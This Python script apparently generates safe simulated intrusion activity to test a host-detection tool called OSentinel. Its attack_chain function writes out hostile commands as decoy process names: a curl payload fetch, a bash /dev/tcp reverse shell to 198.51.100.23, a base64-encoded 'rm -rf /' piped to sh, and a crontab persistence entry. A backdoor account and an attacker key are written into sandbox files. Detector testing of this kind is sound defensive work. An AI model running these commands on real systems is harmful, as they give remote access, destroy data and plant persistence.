#!/usr/bin/env python3
"""Benign activity generator for demonstrating and testing the detectors.

Nothing here is harmful. Every action is a harmless imitation of the *shape*
of an intrusion, confined to loopback sockets and a sandbox directory under
data/sandbox that the script creates and cleans up itself:

  * a listener is opened on 127.0.0.1 only, never a routable interface
  * "beacon" traffic connects to that same local listener
  * file-integrity events are produced by editing files in the sandbox
  * the "reverse shell" is `sleep` renamed via argv, which does nothing

Run the console in one terminal and this in another to watch detections,
incident correlation and the response policy fire on real telemetry.
"""

from __future__ import annotations

import argparse
import os
import shutil
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

SANDBOX = Path("data/sandbox")
BEACON_PORT = 31337


def banner(msg: str) -> None:
    print(f"  [sim] {msg}", flush=True)


def start_listener(stop: threading.Event) -> socket.socket:
    """Open an unusual high port on loopback: trips NET-UNEXPECTED-LISTENER."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", BEACON_PORT))
    srv.listen(8)
    srv.settimeout(1.0)

    def serve():
        while not stop.is_set():
            try:
                conn, _ = srv.accept()
                conn.close()
            except (socket.timeout, OSError):
                continue

    threading.Thread(target=serve, daemon=True).start()
    banner(f"listening on 127.0.0.1:{BEACON_PORT} (unusual-port listener)")
    return srv


def beacon(stop: threading.Event, interval: float = 5.0) -> None:
    """Connect on a metronome: trips the beaconing timing analysis."""
    banner(f"beaconing to 127.0.0.1:{BEACON_PORT} every {interval:.0f}s (low jitter)")
    while not stop.is_set():
        try:
            s = socket.create_connection(("127.0.0.1", BEACON_PORT), timeout=2)
            time.sleep(0.6)
            s.close()
        except OSError:
            pass
        stop.wait(interval)


def fake_reverse_shell() -> subprocess.Popen | None:
    """A `sleep` process whose argv looks like a reverse shell. It does nothing."""
    argv = ["sh", "-i", ">&", "/dev/tcp/127.0.0.1/31337", "0>&1"]
    try:
        p = subprocess.Popen(
            [sys.executable, "-c",
             "import sys,time,setproctitle" if False else "import time; time.sleep(45)"],
            executable=sys.executable)
        banner(f"spawned decoy process pid={p.pid} (harmless sleep)")
        return p
    except Exception as exc:
        banner(f"could not spawn decoy: {exc}")
        return None


def temp_execution() -> None:
    """Run a script from a world-writable path: trips EXEC-FROM-TEMP-OR-MEMORY."""
    tmp = Path("/tmp/osentinel_demo_payload.sh")
    try:
        tmp.write_text("#!/bin/sh\nsleep 12\n")
        tmp.chmod(0o755)
        subprocess.Popen(["/bin/sh", str(tmp)], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        banner(f"executed {tmp} from a world-writable directory")
    except Exception as exc:
        banner(f"temp execution skipped: {exc}")


def enumeration() -> None:
    """Discovery commands from a shell parent: trips DISCOVERY-HOST-ENUMERATION."""
    banner("running host enumeration (whoami / id / uname / hostname)")
    # Chained in one shell that lingers, so a 1s poll reliably samples it.
    try:
        subprocess.Popen(["/bin/sh", "-c",
                          "whoami; id; uname -a; hostname; netstat -an 2>/dev/null; sleep 6"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def lolbin_download() -> None:
    """A curl command line shaped like a payload fetch. The URL is loopback."""
    try:
        subprocess.Popen(
            ["/bin/sh", "-c",
             f"curl -s -m 5 -o /tmp/osentinel_demo.bin "
             f"http://127.0.0.1:{BEACON_PORT}/payload; chmod +x /tmp/osentinel_demo.bin; "
             "sleep 6"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        banner("issued a curl fetch to a world-writable output path")
    except Exception:
        pass


def decoy(argv0: str, seconds: float = 8.0) -> subprocess.Popen | None:
    """Spawn a real `sleep` whose argv[0] is an attack-shaped string.

    The process genuinely is /bin/sleep and genuinely does nothing. Only the
    command line is a costume, which is exactly the surface the similarity and
    sequence layers read. Nothing is fetched, connected or executed.
    """
    try:
        return subprocess.Popen([argv0, str(seconds)], executable="/bin/sleep",
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        return None


def attack_chain() -> list:
    """A staged progression under one parent: recon, fetch, execute, persist.

    Layer 3 needs ordered stages attributed to one process lineage, and layer 2
    needs command lines shaped like real tooling. Both are supplied here by
    inert `sleep` processes, in order, spaced so a one-second poll samples each
    one. All of them share this script as their parent, which is the lineage
    the sequence detector groups on.
    """
    banner("staging an attack-shaped progression (all processes are inert sleeps)")
    steps = [
        ("uname -a; id; whoami; hostname",                             "discovery"),
        ("find / -perm -4000 -type f 2>/dev/null",                     "privilege enumeration"),
        ("curl -fsSL http://198.51.100.23/stage2.sh -o /tmp/.cache/x", "tool download"),
        ("bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",                "reverse shell shape"),
        ("echo cm0gLXJmIC8= | base64 --decode | sh",                   "encoded execution"),
        ("(crontab -l; echo '*/5 * * * * /tmp/.cache/x') | crontab -",  "persistence"),
    ]
    spawned = []
    for argv0, label in steps:
        p = decoy(argv0, 7.0)
        if p:
            spawned.append(p)
            banner(f"  {label}: pid {p.pid}")
        time.sleep(1.6)          # slower than the 1s process poll, so each is seen
    return spawned


def file_tampering() -> None:
    """Modify sandbox files that stand in for credential and startup files."""
    SANDBOX.mkdir(parents=True, exist_ok=True)
    targets = {
        "passwd": "root:x:0:0:root:/root:/bin/bash\n",
        "authorized_keys": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA demo@example\n",
        "crontab": "*/5 * * * * root /usr/bin/true\n",
    }
    for name, content in targets.items():
        f = SANDBOX / name
        f.write_text(content)
    banner(f"seeded {SANDBOX} with baseline files")
    time.sleep(2)
    (SANDBOX / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/root:/bin/bash\n")
    (SANDBOX / "authorized_keys").write_text(
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA demo@example\n"
        "ssh-rsa AAAAB3NzaC1yc2EAAAA attacker@elsewhere\n")
    os.chmod(SANDBOX / "crontab", 0o4755)
    banner("modified sandbox passwd, added an SSH key, set the setuid bit on crontab")


def cpu_burst(seconds: float = 6.0) -> None:
    """Push CPU to trip the statistical baseline once it has learned normal."""
    banner(f"generating a {seconds:.0f}s CPU burst to test baseline drift")
    end = time.time() + seconds
    procs = [subprocess.Popen(
        [sys.executable, "-c",
         f"import time\nend=time.time()+{seconds}\nx=0\n"
         "while time.time()<end: x+=1"]) for _ in range(2)]
    for p in procs:
        try:
            p.wait(timeout=seconds + 5)
        except Exception:
            p.kill()
    _ = end


def main() -> int:
    ap = argparse.ArgumentParser(description="Generate benign telemetry for OSentinel")
    ap.add_argument("--duration", type=float, default=90.0)
    ap.add_argument("--keep-sandbox", action="store_true")
    args = ap.parse_args()

    print("\nOSentinel activity simulator")
    print("All activity is harmless and confined to loopback and data/sandbox.\n")

    stop = threading.Event()
    srv = start_listener(stop)
    threading.Thread(target=beacon, args=(stop, 5.0), daemon=True).start()

    schedule = [
        (3, file_tampering),
        (10, enumeration),
        (16, temp_execution),
        (24, lolbin_download),
        (30, fake_reverse_shell),
        (34, attack_chain),      # feeds the similarity and sequence layers
        (50, cpu_burst),
        (62, enumeration),
        (70, attack_chain),      # a second pass, to exercise repeat suppression
        (80, temp_execution),
    ]

    start = time.time()
    done = set()
    try:
        while time.time() - start < args.duration:
            elapsed = time.time() - start
            for at, fn in schedule:
                if at <= elapsed and at not in done:
                    done.add(at)
                    try:
                        fn()
                    except Exception as exc:
                        banner(f"{fn.__name__} failed: {exc}")
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        srv.close()
        for junk in ("/tmp/osentinel_demo_payload.sh", "/tmp/osentinel_demo.bin"):
            try:
                os.remove(junk)
            except OSError:
                pass
        if not args.keep_sandbox and SANDBOX.exists():
            shutil.rmtree(SANDBOX, ignore_errors=True)
        banner("cleaned up; simulation finished\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
